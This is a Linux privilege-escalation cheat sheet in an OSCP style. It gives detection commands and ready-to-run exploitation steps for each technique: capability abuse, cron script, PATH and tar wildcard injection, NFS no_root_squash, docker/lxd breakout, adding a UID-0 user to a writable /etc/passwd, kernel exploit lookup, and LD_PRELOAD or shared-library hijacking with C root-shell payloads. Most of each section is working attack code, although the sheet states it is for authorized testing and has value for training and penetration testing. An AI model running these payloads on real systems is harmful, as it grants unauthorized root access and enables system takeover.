# Linux Privilege Escalation — Advanced Technique Reference (OSCP-style)

*Beyond `sudo -l` and basic SUID binaries. For authorized penetration testing / CTF use only.*

---

## 1. Linux Capabilities Abuse

**Explanation:** Capabilities split root's power into discrete units (e.g., `cap_setuid`, `cap_dac_override`, `cap_sys_admin`) that can be attached directly to a binary via extended file attributes, independent of SUID. A binary with `cap_setuid+ep` can call `setuid(0)` without being SUID-root itself, and won't show up in a SUID hunt — a common OSCP gotcha.

**Detection:**
```bash
# Find all capabilities set on the filesystem
getcap -r / 2>/dev/null

# Check a specific binary
getcap /usr/bin/python3.9
```

**Exploitation example (cap_setuid on python):**
```bash
# If python3 has cap_setuid+ep
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Other common abusable caps: `cap_dac_read_search` (read any file, e.g. `tar` trick), `cap_sys_admin` (mount abuse / container breakout), `cap_sys_ptrace` (inject into root processes with `gdb`/python-ptrace).

**Reference:** https://gtfobins.github.io/ (filter by "Capabilities" on each binary page)
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

---

## 2. Cron Job Abuse

### 2a. Writable cron scripts

**Explanation:** If a script executed by root's crontab is writable by your user, append/replace it with a payload that runs as root on the next trigger.

**Detection:**
```bash
cat /etc/crontab /etc/cron.d/* 2>/dev/null
ls -la /etc/cron.daily /etc/cron.hourly /etc/cron.weekly
# find scripts referenced in crontabs and check writability
find / -writable -type f 2>/dev/null | grep -E "cron|\.sh$"
pspy64  # observe cron/process activity live without root (great for confirming timing)
```

**Exploitation:**
```bash
echo 'chmod +s /bin/bash' >> /path/to/writable_root_cron_script.sh
# wait for cron to fire, then:
/bin/bash -p
```

### 2b. PATH hijacking in cron

**Explanation:** If a root crontab entry calls a binary by relative/bare name (not full path) and the cron `PATH` includes a directory you can write to (or the script itself sets an insecure `PATH`), plant a malicious binary with that name earlier in PATH.

**Detection:**
```bash
cat /etc/crontab   # look at the PATH= line and job commands (no leading /)
```

**Exploitation:**
```bash
# Example: /etc/crontab has PATH=/home/user:/usr/bin and job calls `overwrite.sh`
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
# wait for cron, then:
/bin/bash -p
```

### 2c. Wildcard injection (tar/rsync "checkmate" trick)

**Explanation:** Root cron scripts using `tar`, `rsync`, or `chown` with a wildcard (`*`) inside an attacker-writable directory can be tricked — the shell expands `*` to filenames, and specially named files are interpreted as command flags (GTFOBins-documented flag abuse).

**Detection:**
```bash
grep -r "cd .*&&.*\*" /etc/cron* 2>/dev/null
cat /etc/cron.d/*   # look for `tar czf ... *` or `chown -R * ...` patterns in a writable dir
```

**Exploitation (tar wildcard → root shell):**
```bash
cd /writable/backup/dir
echo 'chmod +s /bin/bash' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
# when root cron runs: tar czf backup.tar.gz *
# wait for cron, then:
/bin/bash -p
```

**Reference:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-tar-files-being-executed-by-root
https://gtfobins.github.io/gtfobins/tar/ (wildcard/checkpoint technique)
https://github.com/DominicBreuker/pspy (cron/process monitoring without root)

---

## 3. NFS `no_root_squash` Abuse

**Explanation:** By default NFS "squashes" root on the client to `nobody` on the server. If an exported share is configured with `no_root_squash`, a client-side root user retains root over files on that share — so you can create a SUID binary as root on your attacker machine, drop it on the mount, and execute it as the target's local user (root's UID is preserved).

**Detection (from the target, unauthenticated read of exports; or attacker box):**
```bash
cat /etc/exports 2>/dev/null            # on target if readable
showmount -e <target_ip>                # from attacker box
```
Look for `no_root_squash` (or absence of `root_squash`) in the export line, e.g.:
```
/srv/nfs_share *(rw,sync,no_root_squash)
```

**Exploitation (from attacker machine, as root):**
```bash
mkdir /mnt/nfs_target
mount -o rw,vers=3 <target_ip>:/srv/nfs_share /mnt/nfs_target

cd /mnt/nfs_target
cp /bin/bash ./rootbash
chmod +xs ./rootbash          # SUID as root, since your root maps 1:1

umount /mnt/nfs_target
```
Then on the **target** host (as a low-priv user with access to the share):
```bash
/srv/nfs_share/rootbash -p
```

**Reference:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation#no_root_squash

---

## 4. Docker / LXD Group Breakout

### 4a. Docker group

**Explanation:** Membership in the `docker` group is root-equivalent — you can mount the host filesystem into a container you control and chroot into it.

**Detection:**
```bash
id            # look for 'docker' in groups
groups
ls -la /var/run/docker.sock
```

**Exploitation:**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# now you're root on the host filesystem
```

### 4b. LXD/LXC group

**Explanation:** Same concept — `lxd`/`lxc` group membership lets you build/import a privileged container image with the host `/` bind-mounted.

**Detection:**
```bash
id            # look for 'lxd' or 'lxc' in groups
```

**Exploitation:**
```bash
# On attacker box: build minimal alpine image (or use pre-built distrobuilder image)
lxc init alpine mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
# inside container:
cd /mnt/root
chroot . /bin/sh
```

**Reference:** https://gtfobins.github.io/gtfobins/docker/
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/lxd-lxc-group-privilege-escalation

---

## 5. Writable `/etc/passwd`

**Explanation:** `/etc/passwd` only needs to be *readable* for logins normally, but if it's writable by your user (misconfig), you can add a new UID-0 user with a known password hash, or overwrite an existing entry.

**Detection:**
```bash
ls -la /etc/passwd
find / -writable 2>/dev/null | grep passwd
```

**Exploitation:**
```bash
# Generate a password hash (openssl or python)
openssl passwd -1 -salt xyz password123
# => $1$xyz$examplehashvalue

# Append a new root-equivalent user
echo 'hacker:$1$xyz$examplehashvalue:0:0:root:/root:/bin/bash' >> /etc/passwd

su hacker
# password: password123
```

**Reference:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd-file

---

## 6. Kernel Exploit Lookup Workflow

**Explanation:** When no configuration-based vector exists, an unpatched kernel/OS package vulnerability may grant root. This is the last resort in OSCP (noisy, can crash the box) — verify with an automated suggester before hand-searching CVEs.

**Detection / recon:**
```bash
uname -a
cat /etc/os-release
cat /proc/version
lsb_release -a 2>/dev/null
```

**Cross-reference workflow:**
1. Run an automated suggester locally to shortlist candidates:
```bash
# linux-exploit-suggester
./linux-exploit-suggester.sh

# linPEAS (broader enumeration incl. kernel exploit hints)
./linpeas.sh

# LES2 alternative
./les.sh
```
2. Take the kernel version (e.g., `Linux victim 5.4.0-70-generic`) and cross-reference:
   - https://www.exploit-db.com/ (search "linux kernel <version>")
   - https://www.cve.org/ or https://nvd.nist.gov/vuln/search
   - https://github.com/search?q=kernel+privilege+escalation (community PoCs — vet before running)
3. Compile/test locally where possible before running on target; kernel exploits can panic the box.

**Exploitation example (generic pattern):**
```bash
# transfer + compile a matched PoC, e.g. CVE-2021-4034 (PwnKit, polkit — technically not "kernel" but same workflow)
gcc exploit.c -o exploit
./exploit
```

**Reference:** https://github.com/mzet-/linux-exploit-suggester
https://github.com/peass-ng/PEASS-ng (linPEAS)
https://www.exploit-db.com/
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits

---

## 7. PATH Hijacking / `LD_PRELOAD` / Library Hijacking

### 7a. PATH hijacking (SUID/sudo binaries calling other commands by name)

**Explanation:** If a SUID binary or a sudo-permitted script invokes another command without an absolute path, and your PATH is searched before the real binary's directory, you can substitute a malicious binary.

**Detection:**
```bash
strings /path/to/suid_binary | grep -v "/"     # look for bare command names
ltrace ./suid_binary 2>&1 | grep exec
sudo -l                                         # check env_keep/SETENV and script contents
```

**Exploitation:**
```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
./vulnerable_suid_binary     # calls "service" by bare name -> executes ours
```

### 7b. `LD_PRELOAD` (when sudo allows env preservation)

**Explanation:** `sudo -l` output showing `env_keep+=LD_PRELOAD` (or `!env_reset`) lets you force any sudo-permitted binary to load a malicious shared library first, running arbitrary code as root.

**Detection:**
```bash
sudo -l
# look for: env_keep+=LD_PRELOAD   or   Defaults env_keep+="LD_PRELOAD"
```

**Exploitation:**
```c
// preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```
```bash
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <any_allowed_command>
```

### 7c. Shared library hijacking (missing/writable `.so`)

**Explanation:** If a SUID binary attempts to load a shared library from a writable, non-standard path (found via `ldd`/`strace`), plant a malicious `.so` that executes on load.

**Detection:**
```bash
ldd /path/to/suid_binary
strace -f -e trace=open,openat ./suid_binary 2>&1 | grep -i "no such file"
```

**Exploitation:**
```c
// libshared.c
#include <stdio.h>
#include <stdlib.h>
void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```
```bash
gcc -shared -fPIC -o /path/writable/missing_lib.so.6 libshared.c
./suid_binary
```

**Reference:** https://gtfobins.github.io/gtfobins/env/#sudo (LD_PRELOAD pattern shown per-binary under "Sudo" function)
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path-abuses

---

## Summary Table

| Technique | Key Detection Command | Key Reference |
|---|---|---|
| Capabilities | `getcap -r / 2>/dev/null` | gtfobins.github.io |
| Cron writable script | `cat /etc/crontab`, `pspy64` | hacktricks.xyz |
| Cron PATH hijack | `cat /etc/crontab` (PATH=) | hacktricks.xyz |
| Cron wildcard injection | `cat /etc/cron.d/*` | gtfobins.github.io/tar |
| NFS no_root_squash | `cat /etc/exports`, `showmount -e` | hacktricks.xyz |
| Docker group | `id` (docker group) | gtfobins.github.io/docker |
| LXD group | `id` (lxd group) | hacktricks.xyz (lxd) |
| Writable /etc/passwd | `ls -la /etc/passwd` | hacktricks.xyz |
| Kernel exploit | `uname -a` + linux-exploit-suggester | exploit-db.com, github.com/mzet-/linux-exploit-suggester |
| PATH hijack | `strings`/`ltrace` on SUID bin | hacktricks.xyz |
| LD_PRELOAD | `sudo -l` (env_keep) | gtfobins.github.io |
| Library hijack | `strace -f -e trace=open` | hacktricks.xyz |

---

**General enumeration tools to run first in any engagement:** `linpeas.sh` (https://github.com/peass-ng/PEASS-ng), `pspy` (https://github.com/DominicBreuker/pspy), `linux-exploit-suggester` (https://github.com/mzet-/linux-exploit-suggester), and always cross-check specific binaries against **GTFOBins** (https://gtfobins.github.io) and the full **HackTricks Linux Privilege Escalation** page (https://book.hacktricks.xyz/linux-hardening/privilege-escalation) for the current, most exhaustive technique catalog.
